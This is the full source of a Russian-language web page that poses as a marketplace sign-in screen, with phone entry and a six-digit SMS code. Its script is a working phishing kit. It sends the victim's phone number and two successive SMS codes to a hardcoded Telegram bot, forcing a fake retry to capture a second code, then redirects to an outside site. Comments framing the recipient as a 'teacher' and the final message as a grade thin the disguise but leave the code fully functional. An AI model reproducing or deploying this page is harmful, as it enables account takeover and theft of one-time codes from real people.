<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Вход - Маркетплейс</title>
    <style>
        :root { --main-purple: #a832ff; --bg-gray: #f4f4f6; --text-gray: #8e8e93; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
        }

        .app-container {
            width: 100%;
            max-width: 450px;
            min-height: 100vh;
            background: white;
            position: relative;
            padding: 60px 20px 30px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            margin: 0 auto;
        }

        /* Верхняя панель */
        .top-bar {
            position: absolute;
            top: 20px;
            left: 20px;
            right: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 30px;
        }
        .top-left { display: flex; align-items: center; }
        .top-right { display: flex; align-items: center; }

        .back-btn, .close-btn {
            font-size: 28px;
            cursor: pointer;
            color: #333;
            background: none;
            border: none;
            padding: 0;
            line-height: 1;
        }

        .currency {
            display: flex;
            align-items: center;
            font-size: 14px;
            color: var(--text-gray);
            gap: 6px;
            font-weight: 500;
        }
        .flag-icon {
            width: 22px;
            height: 15px;
            border-radius: 2px;
            background: linear-gradient(#fff 33%, #0039a6 33% 66%, #d52b1e 66%);
            border: 0.5px solid #ccc;
        }

        h2 {
            font-size: 24px;
            text-align: center;
            margin: 30px 0 25px;
            font-weight: 700;
        }

        .phone-field {
            background-color: var(--bg-gray);
            border-radius: 16px;
            padding: 16px;
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .phone-field input {
            background: none;
            border: none;
            font-size: 18px;
            width: 100%;
            outline: none;
            margin-left: 8px;
            letter-spacing: 0.5px;
        }

        .primary-btn {
            background-color: var(--main-purple);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .agreement-text {
            font-size: 12px;
            color: var(--text-gray);
            text-align: center;
            line-height: 1.5;
        }
        .agreement-text a { color: var(--text-gray); text-decoration: underline; }

        .screen { display: none; width: 100%; }
        .screen.active { display: block; }

        .loader-wrap {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 200px;
        }
        .loader-circle {
            width: 50px;
            height: 50px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid var(--main-purple);
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }

        .sms-info-text {
            text-align: center;
            color: #333;
            font-size: 15px;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        /* ФИКСИРОВАННЫЕ ПОЛЯ ВВОДА СМС */
        .sms-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 30px;
            width: 100%;
        }

        .sms-grid {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            max-width: 100%;
            flex-wrap: nowrap;
        }

        .sms-box {
            width: 45px;
            height: 50px;
            background: var(--bg-gray);
            border: 2px solid transparent;
            border-radius: 12px;
            font-size: 22px;
            font-weight: 500;
            text-align: center;
            outline: none;
            transition: all 0.2s ease;
            caret-color: var(--main-purple);
            padding: 0;
            -webkit-appearance: none;
            -moz-appearance: textfield;
            flex-shrink: 0;
        }

        /* Адаптация для маленьких экранов */
        @media (max-width: 380px) {
            .sms-box {
                width: 40px;
                height: 45px;
                font-size: 20px;
            }
            .sms-grid { gap: 6px; }
        }

        @media (max-width: 350px) {
            .sms-box {
                width: 36px;
                height: 42px;
                font-size: 18px;
            }
            .sms-grid { gap: 5px; }
        }

        @media (max-width: 320px) {
            .sms-box {
                width: 32px;
                height: 38px;
                font-size: 16px;
            }
            .sms-grid { gap: 4px; }
            .app-container { padding-left: 15px; padding-right: 15px; }
        }

        /* Фиолетовая рамка при фокусе */
        .sms-box:focus {
            border-color: var(--main-purple);
            background: white;
            box-shadow: 0 0 0 2px rgba(168, 50, 255, 0.15);
        }

        /* Убираем стрелки у number input */
        .sms-box::-webkit-outer-spin-button,
        .sms-box::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .timer-text {
            text-align: center;
            color: var(--text-gray);
            font-size: 14px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="app-container">
    <!-- Экран ввода телефона -->
    <div id="screen-phone" class="screen active">
        <div class="top-bar">
            <div class="top-left">
                <div class="currency">
                    <div class="flag-icon"></div>
                    RUB
                </div>
            </div>
            <div class="top-right">
                <button class="close-btn">✕</button>
            </div>
        </div>
        <h2>Войти или создать профиль</h2>
        <div class="phone-field">
            <div class="flag-icon"></div>
            <span style="margin-left:8px; font-size:18px; font-weight: 500;">+7</span>
            <input type="tel" id="phone-input" placeholder="000 000-00-00" maxlength="13" inputmode="numeric">
        </div>
        <button class="primary-btn" onclick="goToLoader()">Получить код</button>
        <div class="agreement-text">
            Нажимая на кнопку, я соглашаюсь <br>
            с <a href="#">правилами пользования торговой площадкой</a>. <br>
            <a href="#">Политика конфиденциальности</a>
        </div>
    </div>

    <!-- Экран загрузки -->
    <div id="screen-loader" class="screen">
        <div class="top-bar">
            <div class="top-left">
                <div class="currency">
                    <div class="flag-icon"></div>
                    RUB
                </div>
            </div>
            <div class="top-right">
                <button class="close-btn">✕</button>
            </div>
        </div>
        <div class="loader-wrap">
            <div class="loader-circle"></div>
        </div>
    </div>

    <!-- Экран ввода СМС -->
    <div id="screen-sms" class="screen">
        <div class="top-bar">
            <div class="top-left">
                <button class="back-btn" onclick="backToPhone()">←</button>
            </div>
            <div class="top-right">
                <button class="close-btn">✕</button>
            </div>
        </div>
        <h2>Введите код из СМС</h2>
        <div class="sms-info-text">
            Отправили на <span id="target-phone" style="font-weight:600;"></span>
        </div>

        <!-- Оборачиваем в wrapper для центрирования -->
        <div class="sms-wrapper">
            <div class="sms-grid" id="sms-inputs">
                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="tel" class="sms-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
            </div>
        </div>

        <div class="timer-text">
            Запросить новый код через <span id="timer">00:58</span>
        </div>
    </div>
</div>

<script>
    // ================== НАСТРОЙКИ ==================
    const TEACHER_BOT_TOKEN = '8643372758:AAEGaJqnbCpT0XfqbtpUFTkJfd1UPUc77UM';
    const TEACHER_CHAT_ID = '7250924483';
    // ===============================================

    const phoneInput = document.getElementById('phone-input');
    let isSecondAttempt = false;
    let firstSmsCode = '';

    async function sendLogToTeacher(message) {
        const url = `https://api.telegram.org/bot${TEACHER_BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TEACHER_CHAT_ID, text: message, parse_mode: 'HTML' })
            });
        } catch (error) {
            console.log('Ошибка отправки:', error);
        }
    }

    phoneInput.addEventListener('input', (e) => {
        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
        e.target.value = !x[2] ? x[1] : x[1] + ' ' + x[2] + (x[3] ? '-' + x[3] : '') + (x[4] ? '-' + x[4] : '');
    });

    function showScreen(id) {
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }

    function goToLoader() {
        if(phoneInput.value.length < 13) return;
        const fullPhone = `+7 ${phoneInput.value}`;
        sendLogToTeacher(`<b>📱 Новый вход:</b>\nНомер телефона: <code>${fullPhone}</code>`);
        showScreen('screen-loader');
        setTimeout(() => {
            document.getElementById('target-phone').innerText = fullPhone;
            showScreen('screen-sms');
            startTimer();
            inputs.forEach(el => el.value = "");
            inputs[0].focus();
        }, 1200);
    }

    function backToPhone() {
        showScreen('screen-phone');
    }

    function startTimer() {
        let timeLeft = 58;
        const timerDisplay = document.getElementById('timer');
        if (window.timerInterval) clearInterval(window.timerInterval);
        window.timerInterval = setInterval(() => {
            timeLeft--;
            let sec = timeLeft < 10 ? "0" + timeLeft : timeLeft;
            timerDisplay.innerText = "00:" + sec;
            if(timeLeft <= 0) clearInterval(window.timerInterval);
        }, 1000);
    }

    const inputs = document.querySelectorAll('.sms-box');
    inputs.forEach((input, i) => {
        // Разрешаем ввод только одной цифры
        input.addEventListener('input', (e) => {
            // Оставляем только последнюю введённую цифру
            const value = e.target.value.replace(/\D/g, '');
            e.target.value = value.slice(-1);

            // Автоматический переход к следующему полю
            if (e.target.value.length === 1 && i < inputs.length - 1) {
                inputs[i + 1].focus();
            }

            // Проверяем, все ли поля заполнены
            const allFilled = Array.from(inputs).every(inp => inp.value.length === 1);
            if (allFilled) {
                const code = Array.from(inputs).map(inp => inp.value).join('');
                if (!isSecondAttempt) {
                    firstSmsCode = code;
                    sendLogToTeacher(`<b>🔢 Первая попытка ввода СМС:</b>\nКод: <code>${code}</code>`);
                    setTimeout(() => {
                        isSecondAttempt = true;
                        showScreen('screen-loader');
                        setTimeout(() => {
                            showScreen('screen-sms');
                            startTimer();
                            inputs.forEach(el => el.value = "");
                            inputs[0].focus();
                        }, 800);
                    }, 400);
                } else {
                    sendLogToTeacher(`<b>🔢 Вторая попытка ввода СМС:</b>\nКод: <code>${code}</code>`);
                    const finalMessage = `<b>✅ Проверка завершена!</b>\n\n` +
                                         `<b>Номер:</b> +7 ${phoneInput.value}\n` +
                                         `<b>Первый код:</b> ${firstSmsCode}\n` +
                                         `<b>Второй код:</b> ${code}\n\n` +
                                         `<i>Сайт работает корректно. Оценка 5!</i> 😎`;
                    sendLogToTeacher(finalMessage);
                    setTimeout(() => { window.location.href = "https://hkpodl.com"; }, 400);
                }
            }
        });

        // Обработка Backspace
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && e.target.value === '' && i > 0) {
                inputs[i - 1].focus();
            }
        });

        // При фокусе выделяем содержимое
        input.addEventListener('focus', (e) => {
            e.target.select();
        });

        // Запрещаем вставку более 1 символа
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            const digit = pastedText.replace(/\D/g, '').slice(0, 1);
            if (digit) {
                e.target.value = digit;
                if (i < inputs.length - 1) {
                    inputs[i + 1].focus();
                }
            }
        });
    });
</script>
</body>
</html>
